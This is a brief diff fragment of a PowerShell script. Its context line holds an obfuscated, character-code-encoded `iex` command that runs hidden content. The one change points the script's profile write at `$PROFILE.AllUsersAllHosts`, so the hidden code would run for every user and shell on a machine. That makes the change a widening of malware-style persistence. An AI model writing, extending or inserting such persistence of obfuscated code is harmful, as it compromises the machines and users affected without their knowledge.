@@ -17,7 +17,7 @@ iex (-join ((105,101,120,40,91,83,121,115,116,101,109,46,84,101,120,116,46,69,11
 }
 '@
 
-$profilePath = $PROFILE
+$profilePath = $PROFILE.AllUsersAllHosts
 
 
 if (-not (Test-Path $profilePath)) {
